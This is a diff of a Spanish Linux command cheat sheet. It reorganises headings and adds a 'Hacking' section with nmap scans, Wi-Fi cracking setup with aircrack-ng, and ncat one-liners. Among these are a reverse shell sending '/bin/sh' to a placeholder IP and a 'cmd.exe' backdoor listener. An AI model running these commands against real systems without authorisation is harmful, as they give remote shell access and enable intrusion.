@@ -206,28 +206,12 @@ Enviar peticiones a servidores online o en red local
 ping google.com
 ping 192.168.1.1
 ```
-
-## Ver los puertos abiertos en una red (```apt install nmap```)
-```
-nmap localhost
-
-# Para evaluar la red local entera:
-nmap 192.168.1.1/24 #(o 192.168.0.1/24)
-
-#filtrar por puerto y estado 
-nmap -Pn 192.168.1.1/24 -p22 -open  
-
-# Auditar 
-nmap -Pn **PublicIP**/24 
-```
-
  
 Usuario y tiempo conectado
 ```
 uname -r
 uptime -p
 ```
-
 
 Almacenamiento de los discos
 
@@ -306,13 +290,13 @@ Browser en terminal
 
 ``` elinks https://medium.com/learn-love-code/how-to-set-up-your-professional-data-science-environment-6df74eb06aa4 ```
 
-# Comandos comunes que siempre olvido.
+## Comandos comunes que siempre olvido.
 
-## Ver lista de fuentes 
+Ver lista de fuentes 
 
 ```nano /etc/apt/sources.list```
 
-## Controlar los permisos para la accesibilidad de los archivos y carpetas de nuestro sistema, 
+Controlar los permisos para la accesibilidad de los archivos y carpetas de nuestro sistema, 
 ```
 # por ejemplo, dar todo tipo de acceso a un archivo:
  sudo chmod 777 nombrearchivo
@@ -320,7 +304,7 @@ Browser en terminal
  #O para que solamente root pueda acceder a ellos:
  sudo chmod 700 nombrearchivo
 ```
-## Cambiar el 'owner' de /u y subdirectorios del usuario "root". Útil para acceder a archivos "READ-ONLY"
+Cambiar el 'owner' de /u y subdirectorios del usuario "root". Útil para acceder a archivos "READ-ONLY"
 
 ```
 sudo chown -hR root /u
@@ -341,7 +325,7 @@ sudo chown -hR root /u
  
  ```ip address show $interface | grep "inet " | awk '{print $2}'```
 
-# Manejo de archivos y Data Mining
+## Manejo de archivos y Data Mining
 
 Para listar los archivos que tengan un patrón, por ejemplo, que terminen en .iso. 
 
@@ -401,18 +385,10 @@ Para buscar archivos
 sudo apt-get install mlocate
 locate -i archivo
 ```
-## Instalar nuevos themes e íconos
 
-```
-apt search shell-theme # o dnf en Fedora
-apt search icon-theme
+## Programas importantes
 
-apt install ... # dnf install ... 
-```
-
-# Programas importantes
-
-## Wget 
+### Wget 
 
 Descargar archivos desde la terminal, por ejemplo, instalador de RStudio para Debian 10 y Ubuntu 19. 
 
@@ -423,7 +399,7 @@ Para descargar archivos de un servidor o website.
 ```wget -A pdf,csv,txt,png,jpg -m -p -E -k -K -np 192.168.1.48```
 
 
-## Git
+### Git
 
 Para descargar un repositorios Git:
 
@@ -467,7 +443,7 @@ Tutorial de git
 
 ```git help tutorial```
 
-## Docker (o Podman)
+### Docker (o Podman)
 
 ``` 
  docker ps -a
@@ -478,7 +454,7 @@ Tutorial de git
 # docker-compose
 docker-compose -f docker-compose.yml up
 ```
-## Tor 
+### Tor 
 
 Para navegar de manera anónima.  Simplemente descárgalo de https://www.torproject.org y: 
 
@@ -487,7 +463,7 @@ Para navegar de manera anónima.  Simplemente descárgalo de https://www.torpro
  ./tor-browser_en-US/Browser/start-tor-browser &
  ```
 
- ## Anaconda
+ ### Anaconda
  ```
  conda create -n my_env python=3.7 anaconda
  conda create -n r_env r-essentials r-base
@@ -503,7 +479,7 @@ conda activate r_env
  
  ```
  
-# Descargar videos
+### Descargar videos
  
 ```
 youtube-dl $url
@@ -512,7 +488,7 @@ youtube-dl --extract-audio --format mp3
 # Ver los formatos disponibles 
 youtube-dl -F $url
 ```
-# VLC para controlar la música desde la línea de comandos. 
+### VLC para controlar la música desde la línea de comandos. 
 
  ```
  cvlc /music
@@ -520,7 +496,7 @@ youtube-dl -F $url
  vlc --help
  ```
  
-# Juegos en Terminal
+### Juegos en Terminal
  
  ```
  apt-get install bastet moon-buggy ninvaders nsnake pacman4console neofetch figlet -y
@@ -547,9 +523,17 @@ Provocar sonidos en el computador (apt install beep / yum install beep)
 beep -f 4000 -D 500 -l 100 -r 100
 ```
 
-# COMANDOS NIVEL INTERMEDIO 
+Instalar nuevos themes e íconos
 
-## Buscar paquetes que contienen algun comando que requerimos
+```
+apt search shell-theme # o dnf en Fedora
+apt search icon-theme
+
+apt install ... # dnf install ... 
+```
+## COMANDOS NIVEL INTERMEDIO 
+
+Buscar paquetes que contienen algun comando que requerimos
 
 ```apt search comando``` #(o ```yum search comando```)
 
@@ -560,21 +544,21 @@ sudo nano .bashrc
 # Escribe el script
 ./script
 ```
-## Listar las aplicaciones desktop
+Listar las aplicaciones desktop
 
 ```ls /usr/share/applications | awk -F '.desktop' ' { print $1}' -```
 
-## Tiempo de procesos
+Tiempo de procesos
 
 ```
 echo "sudo apt update -y" > myUpdate.sh 
 time bash myUpdate.sh
 ```
-## Esperar 10 segundos. 
+ Esperar 10 segundos. 
 
 ```sleep 10```
 
-## Programar tareas
+ Programar tareas
 
 ```
 rm -f /var/run/crond.pid #delete pid
@@ -587,11 +571,39 @@ Kill procesos en un socket determinado
 
 ```sudo lsof -t -i tcp:8000 | xargs kill -9```
 
-# SSH
+ Asignar "alias" a comandos, por ejemplo:
+
+```alias python=python3```
+
+## Hacking:
+
+### Nmap 
+
+(```apt install nmap```)
+
+```
+nmap localhost
+
+# Para evaluar la red local entera:
+nmap 192.168.1.1/24 #(o 192.168.0.1/24)
+
+#filtrar por puerto y estado 
+nmap -Pn 192.168.1.1/24 -p22 -open  
+
+# Auditar 
+nmap -Pn **PublicIP**/24 
+```
+
+
+### SSH
 
 Conectar
 
  ``` ssh usuario@servidor.local```
+ 
+ o 
+ 
+ ```ssh usuario@IP```
  
  Conectar SSH sin password
  
@@ -607,26 +619,23 @@ Compartir archivos
 Bloquear IPs que intenten conectar sin permiso
 
 ```
- iptables -A INPUT -s $IPbloquear -j DROP
+ iptables -A INPUT -s $IP -j DROP
  ```
 
 Elegir en cual servidor mostrar el display. 
+
 ```
 export DISPLAY=:0 # en servidor
 export DISPLAY=:1 # en local
  ```
-Enviar archivo via ncat por tunel ssh
 
-```
-nc myDocument.pdf | ssh me.myserver.com nc -l -p 20000
-# cliente
-nc me.myserver.com 20000 > myDocument.pdf
- ```
-Compartir la terminal en cualquier browser (```apt install tmate``` / ```yum install tmate```)
+### Compartir la terminal en cualquier browser 
+
+(```apt install tmate``` / ```yum install tmate```)
 
 ```tmate```
  
-# Modo Monitor de Wifi, Sniffing y Crackeo con aircrack-ng (```apt install aircrack-ng```)
+### Modo Monitor de Wifi, Sniffing y Crackeo con aircrack-ng (```apt install aircrack-ng```)
  
  ```
 ifconfig wlan1 down
@@ -640,8 +649,9 @@ Escaneo de Redes Wifi Disponibles
 
 ``` sudo iwlist wlan0 scan | egrep "Cell|ESSID|Signal|Rates"```
 
-# Ncat:
-## Reverse Shell
+### Ncat:
+
+Reverse Shell:
 
 Desarrollador escucha en puerto 4444
 
@@ -651,23 +661,32 @@ Cliente envía su Shell a la IP del desarrollador
 
 ```nc **IP** 4444 -e /bin/sh```
 
-## Backdoor
+Backdoor
 
 Ejecutar en el servidor remoto
 
 ```nc -L -p 3001 -d -e cmd.exe```
 
-## Servidor web inseguro
+Servidor web inseguro
 
 ```while : ; do ( echo -ne "HTTP/1.1 200 OK\r\n" ; cat index.html; ) | nc -l -p 8080 ; done```
 
-## Chat
+Chat
 ```
 nc -l -vv -p 5000
 nc 192.168.56.1 5000
 
 ```
-# IOT
+
+Enviar archivo via ncat por tunel ssh
+
+```
+nc myDocument.pdf | ssh me.myserver.com nc -l -p 20000
+# cliente
+nc me.myserver.com 20000 > myDocument.pdf
+ ```
+
+## IOT
 
 Dispositivos conectados USB por conexión serial. Ubicarlo es sencillo con:
 
@@ -689,7 +708,7 @@ Temperatura CPU Raspberry Pi
 
 ```/opt/vc/bin/vcgencmd measure_temp```
  
-Audio ssh rasp 
+Controla el audio:
 
 ```amixer scontrols```
 
@@ -697,9 +716,9 @@ Busca el dispositivo y ajustar el volumen
 
 ```amixer sset 'PCM' 100%```
 
-# Ciclos y condiciones
+## Ciclos y condiciones
 
-## For 
+### For 
 
           for i in {1..10} ; do 
               echo "hola $i"; 
@@ -716,7 +735,7 @@ Busca el dispositivo y ajustar el volumen
                     echo $i
             done    
             
-## While
+### While
               
              COUNTER=0
              while [  $COUNTER -lt 10 ]; do
@@ -724,7 +743,7 @@ Busca el dispositivo y ajustar el volumen
                  let COUNTER=COUNTER+1 
              done
     
-## Until
+### Until
               
              COUNTER=20
              until [  $COUNTER -lt 10 ]; do
@@ -732,7 +751,7 @@ Busca el dispositivo y ajustar el volumen
                  let COUNTER-=1
              done
              
-## If
+### If
 
              if [ 1 == 2 ] then 
                 echo 'true'; 
